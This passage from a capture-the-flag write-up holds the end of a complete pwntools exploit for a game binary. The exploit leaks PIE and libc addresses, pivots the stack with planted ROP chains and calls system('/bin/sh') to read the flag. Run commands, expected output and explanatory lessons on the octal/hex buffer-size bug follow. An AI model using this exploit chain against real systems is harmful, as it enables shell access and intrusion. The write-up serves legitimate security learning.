    plant_history_entry(r, pie_base + FGETS_SETUP); moves_used += 1

    send_cmd(r, "BBBBBB");           moves_used += 1   # dummy RBP for chainB
    plant_history_entry(r, pie_base + POP_RBP_RET); moves_used += 1
    plant_history_entry(r, chain_base_addr + 0x20); moves_used += 1
    plant_history_entry(r, pie_base + FGETS_SETUP); moves_used += 1

    log.info(f"Chains planted. Moves used: {moves_used}")

    # ── Phase 3: Navigate to Flag & Trigger Overflow ─────────────────
    log.info("Phase 3: Navigate to Flag")
    flag_pos = items[7]
    nav_moves, px, py = navigate_to(r, px, py, flag_pos[0], flag_pos[1])
    moves_used += nav_moves

    r.sendline(b"grab")
    r.recvuntil(b'Password: ', timeout=15)
    log.info("Password prompt received")

    # Overflow: jump to FGETS_SETUP with rbp targeting last_item
    p1 = overflow_payload(pie_base + 0x4030, pie_base + FGETS_SETUP)
    r.send(p1)

    # Write: last_item = &GOT[puts], pivot to chainA
    p2 = fgets_redirect_payload(
        pie_base + GOT_PUTS,       # overwrite last_item
        0x4141414141414141,        # padding
        chainA_addr,               # new RBP → chainA
        pie_base + LEAVE_RET,
    )
    r.send(p2)

    # ── Phase 4: Parse Libc Leak ──────────────────────────────────────
    log.info("Phase 4: Parsing libc leak from print_inventory output")
    r.recvuntil(b'/300 ', timeout=15)
    leaked_bytes = r.recvn(6, timeout=5)
    puts_addr    = u64(leaked_bytes + b'\x00\x00')
    libc_base    = puts_addr - libc.symbols['puts']
    log.success(f"Leaked puts: {hex(puts_addr)}")
    log.success(f"Libc base:   {hex(libc_base)}")

    if libc_base & 0xFFF != 0:
        log.error("Libc base not page-aligned!")
        r.close()
        return None

    # ── Phase 5: Build Final ROP & Get Shell ─────────────────────────
    log.info("Phase 5: Building ROP chain")
    rop_libc = ROP(libc)
    pop_rdi  = rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_base
    binsh    = next(libc.search(b'/bin/sh\x00')) + libc_base
    system   = libc.symbols['system'] + libc_base

    # Write 1: chain_base+0x00 = dummy, chain_base+0x08 = pop_rdi
    pw1 = fgets_redirect_payload(
        0x4141414141414141,  # dummy RBP
        pop_rdi,             # first gadget
        chainB_addr,         # pivot to chainB
        pie_base + LEAVE_RET,
    )
    # Write 2: chain_base+0x10 = /bin/sh, chain_base+0x18 = system
    pw2 = fgets_redirect_payload(
        binsh,               # /bin/sh pointer
        system,              # system()
        chain_base_addr,     # final pivot to chain_base
        pie_base + LEAVE_RET,
    )
    r.send(pw1 + pw2)

    # ── Get Flag ──────────────────────────────────────────────────────
    r.sendline(b'cat /app/flag.txt')
    buf = b''
    flag_re = re.compile(rb'lactf\{[^\n}]+\}')
    for _ in range(40):
        try:
            chunk = r.recv(timeout=1)
        except EOFError:
            break
        if not chunk:
            continue
        buf += chunk
        m = flag_re.search(buf)
        if m:
            flag = m.group(0)
            log.success(f"FLAG: {flag.decode()}")
            r.close()
            return flag

    r.close()
    return None

if __name__ == '__main__':
    for i in range(1, 51):
        try:
            flag = exploit_once()
            if flag:
                print(flag.decode())
                break
        except (ValueError, EOFError) as e:
            log.warning(f"Attempt {i}/50: {e}")
        except Exception as e:
            log.warning(f"Attempt {i}/50: {type(e).__name__}: {e}")
```

### Running the Exploit

**Local (testing):**
```bash
python3 working_exploit.py
```

**Remote:**
```bash
python3 working_exploit.py REMOTE
```

**Expected output:**
```
[*] Phase 1: Board exploration & PIE leak
[*] Found Flag (idx=7) at (0,0)
...
[+] PIE base: 0x58fe29d09000
[*] Phase 2: Planting ROP chains in history
[*] Phase 3: Navigate to Flag
[*] Password prompt received
[*] Phase 4: Parsing libc leak
[+] Leaked puts: 0x7bb63ac26be0
[+] Libc base: 0x7bb63ab9f000
[*] Phase 5: Building ROP chain
[+] FLAG: lactf{Th3_835T_345T3r_399_i5_4_fl49}
```

---

## 12. Key Lessons

### The Bug: Notation Confusion

```c
char password[0020];        // octal = 16
fgets(password, 0x20, ...); // hex   = 32
```

Both look like "20" at a glance. Always be deliberate with numeric literals in C:
- `020` or `0020` → octal
- `0x20` → hexadecimal
- `20` → decimal

### Hacker Mindset: Repurpose Everything

Nothing in this exploit is wasted:
- The **board placement algorithm** → PIE leak
- The **history buffer** → ROP chain storage
- The **fgets call** → arbitrary write primitive AND stack pivot
- The **last_item variable** → libc pointer storage
- The **print_inventory function** → leak printer
- The **high .bss space** → final ROP chain home

A pro hacker doesn't just look for what's broken. They look for **what can be repurposed**.

### Why the Retry Loop?

ASLR occasionally produces addresses containing `\x0a` (newline) or `\x00` (null). Since all writes go through `fgets`, either byte would truncate payloads. The exploit retries up to 50 times until it gets a clean address layout. In practice, this needs 1–3 attempts.

### The `leave; ret` Pivot

`leave; ret` is one of the most powerful gadgets in exploitation:
```
leave = mov rsp, rbp
        pop rbp
ret   = pop rip
```

If you control RBP before `leave` executes, you control where RSP points after — effectively moving the stack to any writable memory you choose.

### 8-Byte Address in 7 Bytes

Sending a 7-byte address works because fgets appends `\x00` as byte 8. Since all 64-bit userspace addresses have `0x00` as their most-significant byte, this is exact. A free null byte.

### Stack Alignment for `system()`

The x86-64 System V ABI requires the stack to be **16-byte aligned at the point of a `call` instruction**. `chain_base = 0x4FC8` satisfies this: `0x4FC8 % 16 == 8`, which means at the point `system` receives control (after the `ret` from `pop rdi; ret`), RSP ends in `...8` — correctly unaligned by one push-worth, as `call` would have been.

If `system` crashes for no obvious reason, check stack alignment first.

---

